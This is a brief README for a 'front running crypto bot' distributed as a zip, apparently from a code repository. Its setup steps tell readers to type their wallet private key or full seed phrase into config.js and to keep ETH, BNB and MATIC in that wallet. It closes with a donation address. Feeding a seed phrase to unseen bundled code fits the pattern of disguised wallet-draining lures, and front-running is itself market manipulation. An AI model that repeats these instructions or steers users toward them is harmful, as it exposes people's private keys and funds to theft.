# fronter_runner
front running crypto bot, feel free to fork and improve or whatever. 
you should be able to modify it to work on various exchanges
if you fork and modify please give credit
This is a tutorial to help run the front-runner bot (javascript version).

Let’s get started.

Part 1. Main software installations.

Extract the front-run-bot.zip anywhere you like.

Part 2. Editing the settings.

Open the bot folder find "config.js" file and open it with a text-editor:

1.Set your wallet address and private key or your wallet seed if you have a wallet that does not give you the private key

2.Set the Network  1 = ETH , 2 = BNB , 3 = Polygon Note: you can set it to "4" to look at all 3 networks but

make sure you have eth ,bnb and matic in the same address that you put in "myaddress" or in your wallet you provided in your wallet seed


Happy hunting! :)

And When you make a big win and if you fill like thanking me my eth/bnb/polygon address is 0x2431bec69aa4699ad9A9aE77233F7bdcD6d631f8
